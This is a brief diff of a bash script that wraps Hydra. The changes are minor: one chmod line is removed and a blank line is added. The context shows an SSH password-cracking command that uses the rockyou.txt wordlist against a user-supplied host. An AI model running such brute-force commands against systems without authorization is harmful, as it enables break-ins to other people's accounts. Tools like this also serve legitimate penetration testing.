@@ -17,7 +17,6 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
         echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
         exit
     else
-        chmod +x *
         sudo rm -rf hydra.restore
         clear
 
@@ -101,6 +100,7 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
                 # If the user inputs something in the 'Input Username' function and the hostname function,
                 # it will continue as normal
                 else
+
                     # Crack SSH password
                     hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                     echo "Connecting to $user@$host"
